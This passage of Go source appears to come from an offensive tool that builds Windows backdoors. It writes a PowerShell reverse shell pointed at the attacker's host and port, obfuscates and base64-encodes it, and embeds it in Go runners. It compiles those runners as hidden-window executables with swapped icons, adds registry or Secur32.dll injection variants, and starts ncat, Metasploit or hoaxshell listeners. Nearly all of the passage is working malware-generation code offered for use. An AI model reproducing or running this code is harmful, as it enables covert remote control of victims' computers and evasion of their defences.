    PshellSource := filepath.Join(utils.TemplateDir, fmt.Sprintf(PshellTemplate, UersProtocol))
    PshellDestination := filepath.Join(utils.GeneratorDir, fmt.Sprintf("powershell_reverse_%s.txt", UersProtocol))

    utils.Copy(PshellSource, PshellDestination)

    utils.Editors(map[string]map[string]string{
        PshellDestination: {"*LHOST*": utils.LHost, "*LPORT*": utils.LPort},
    })
    fmt.Printf("%s%s[+] %sDone Configuring. Payload sample below ...\n", bcolors.Bold, bcolors.Blue, bcolors.Endc)

    Obfuscators(utils.Obfuscator, fmt.Sprintf("/powershell_reverse_%s", UersProtocol), utils.ToolsDir, PshellDestination, utils.GeneratorDir)

    fmt.Printf("%s%s[*] %sEncoding the obfuscated script ...", bcolors.Bold, bcolors.Green, bcolors.Endc)
    ObfuscatedPshell := filepath.Join(utils.GeneratorDir, fmt.Sprintf("%s.ps1", utils.BuildName))
    encoded, err := utils.EncodeFileToPowerShellEncodedCommand(ObfuscatedPshell)
    if err != nil {
        fmt.Fprintf(os.Stderr, "%sError encoding file: %v%s\n", bcolors.Red, err, bcolors.Endc)
        return
    }else{
        fmt.Printf("\n%s%s[+] %sDone encodeing. Results below ...\n%sPowershell -w 1 -enc %s%s%s%s%s\n", bcolors.Bold, bcolors.Blue, bcolors.Endc, bcolors.Bold, bcolors.BrightBlue, bcolors.Endc, bcolors.BrightGreen, encoded, bcolors.Endc)
    }

    fmt.Printf("\n%s%s[*] %sConfiguring Go payload runner ...\n%s%s[+] %sUsing the below Go code sample ...\n", bcolors.Bold, bcolors.Green, bcolors.Endc, bcolors.Bold, bcolors.Blue, bcolors.Endc)
    GoSource := filepath.Join(utils.TemplateDir, GoTemplate)
    GoDestination := filepath.Join(utils.GeneratorDir, "main.go")
    utils.Copy(GoSource, GoDestination)

    utils.Editors(map[string]map[string]string{
        GoDestination: {"africana_backdoor": encoded},
    })

    Delay := 0 * time.Millisecond
    utils.ReadFileLetterByLetter(bcolors.Green, GoSource, Delay)

    fmt.Printf("\n%s%s[*] %sMerging the above code with encoded base64 ...", bcolors.Bold, bcolors.Green, bcolors.Endc)
    fmt.Printf("\n%s%s[+] %sDone merging runner with backdoor. Results below  ...\n", bcolors.Bold, bcolors.Blue, bcolors.Endc)
    utils.ReadFileLetterByLetter(bcolors.BrightGreen, GoDestination, Delay)

    IconChanger(utils.InnerIcon, utils.ToolsDir, utils.GeneratorDir)

    spiner.Start()
    subprocess.Run("cd %s; GOOS=windows GOARCH=amd64 go build -ldflags='-w -s -H windowsgui' -o %s.exe", utils.GeneratorDir, filepath.Join(utils.GeneratorDir, utils.RawBuild))
    spiner.Stop()
    fmt.Printf("\n%s%s[+] %sDone compiling core backdoor ...", bcolors.Bold, bcolors.Blue, bcolors.Endc)
}

func RegSniper(ToolsDir, LPort, HPort, Protocol, Script, OuterIcon, Listener, LHost, GeneratorDir, ExploitsLogs, BuildName string) {
    spiner := utils.New(
        utils.WithStyle("dots"),
        utils.WithEffect("plain"),
        utils.WithText("%s%s[*] %sFusing runner and core ...", bcolors.Bold, bcolors.Green, bcolors.Endc),
        utils.WithClearOnStop(false),
        utils.WithCursorHidden(true),
        utils.WithSpeed(90 * time.Millisecond),
    )

    ShikataGanai(utils.ToolsDir, utils.LPort, utils.HPort, utils.Protocol, utils.Script, utils.Listener, utils.LHost, utils.GeneratorDir)

    exeFilePath := filepath.Join(utils.GeneratorDir, utils.RawBuild + ".exe")
    exeData, _ := ioutil.ReadFile(exeFilePath)
    encodedExe := base64.StdEncoding.EncodeToString(exeData)

    src := filepath.Join(utils.TemplateDir, "go_payloads", "malware_runner_reg.go")
    dst := filepath.Join(utils.GeneratorDir, "main.go")
    subprocess.Run("rm -f %s", dst)
    utils.Copy(src, dst)

    utils.Editors(map[string]map[string]string{
        dst: {"africana_backdoor_e": encodedExe},
    })

    fmt.Printf("\n%s%s[+] %sGenerating final backdoor ...", bcolors.Bold, bcolors.Blue, bcolors.Endc)
    IconChanger(utils.OuterIcon, utils.ToolsDir, utils.GeneratorDir)
    fmt.Printf("\n%s%s[+] %sGenerating final backdoor ...", bcolors.Bold, bcolors.Blue, bcolors.Endc)

    spiner.Start()
    subprocess.Run("cd %s; GOOS=windows GOARCH=amd64 go build -ldflags='-w -s -H windowsgui' -o %s.exe", utils.GeneratorDir, filepath.Join(utils.ExploitsLogs, utils.BuildName))
    spiner.Stop()

    fmt.Printf("\n%s%s[+] %sDone fusing runner and core ...", bcolors.Bold, bcolors.Blue, bcolors.Endc)
    fmt.Printf("\n%s%s[*] %sSaved as %s%s.exe%s\n", bcolors.Bold, bcolors.Green, bcolors.Endc, bcolors.Yellow, filepath.Join(utils.ExploitsLogs, utils.BuildName), bcolors.Endc)

    ListenerLauncher(utils.LPort, utils.HPort, utils.Protocol, utils.Listener)
}

func LithalDll(ToolsDir, LPort, HPort, Protocol, Script, OuterIcon, Listener, LHost, GeneratorDir, ExploitsLogs, BuildName string) {
    ShikataGanai(utils.ToolsDir, utils.LPort, utils.HPort, utils.Protocol, utils.Script, utils.Listener, utils.LHost, utils.GeneratorDir)

    dllFilePath := filepath.Join(utils.TemplateDir, "dll_injects", "Secur32.dll")
    exeFilePath := filepath.Join(utils.GeneratorDir, utils.RawBuild + ".exe")
 
    dllData, _ := ioutil.ReadFile(dllFilePath)
    exeData, _ := ioutil.ReadFile(exeFilePath)

    encodedExe := base64.StdEncoding.EncodeToString(exeData)
    encodedDll := base64.StdEncoding.EncodeToString(dllData)

    src := filepath.Join(utils.TemplateDir, "go_payloads", "malware_runner_dll.go")
    dst := filepath.Join(utils.GeneratorDir, "main.go")
    subprocess.Run("rm -f %s", dst)
    utils.Copy(src, dst)

    utils.Editors(map[string]map[string]string{
        dst: {
            "africana_backdoor_e": encodedExe,
            "africana_backdoor_d": encodedDll,
        },
    })

    fmt.Printf("\n%s%s[+] %sGenerating final backdoor ...", bcolors.Bold, bcolors.Blue, bcolors.Endc)
    IconChanger(utils.OuterIcon, utils.ToolsDir, utils.GeneratorDir)
    subprocess.Run("cd %s; GOOS=windows GOARCH=amd64 go build -ldflags='-w -s -H windowsgui' -o %s.exe", utils.GeneratorDir, filepath.Join(utils.ExploitsLogs, utils.BuildName))
    fmt.Printf("\n%s%s[+] %sProccess Completed Successfully!", bcolors.Bold, bcolors.Blue, bcolors.Endc)
    fmt.Printf("\n%s%s[*] %sSaved as %s%s.exe%s\n", bcolors.Bold, bcolors.Green, bcolors.Endc, bcolors.Yellow, filepath.Join(utils.ExploitsLogs, utils.BuildName), bcolors.Endc)

    ListenerLauncher(utils.LPort, utils.HPort, utils.Protocol, utils.Listener)
}

func ListenerLauncher(LPort, HPort, Protocol, Listener string) {
    fmt.Printf("%s[>] %sLaunching %s%s %slistener ...\n\n", bcolors.Bold, bcolors.Endc, bcolors.Green, utils.Listener, bcolors.Endc)

    switch strings.ToLower(utils.Listener) {
    case "1", "blackjack":
        BlackJack(utils.LHost, utils.LPort, utils.HPort, utils.Protocol, utils.ToolsDir)
        return
    case "2", "hoaxshell":
        HoaxShell(utils.LHost, utils.LPort, utils.HPort, utils.Protocol, utils.ToolsDir)
        return
    case "3", "ncat":
        Ncat(utils.LPort, utils.Protocol)
        return
    case "4", "metasploit":
        Metasploit(utils.LHost, utils.LPort, utils.Protocol)
        return
    default:
        fmt.Printf("\n%s[!] %sError: Invalid LISTENER. %s'%s'%s Try %s'show listeners'%s.", bcolors.BrightRed, bcolors.Endc, bcolors.Yellow, utils.Listener, bcolors.Endc, bcolors.Green, bcolors.Endc)
    }
}
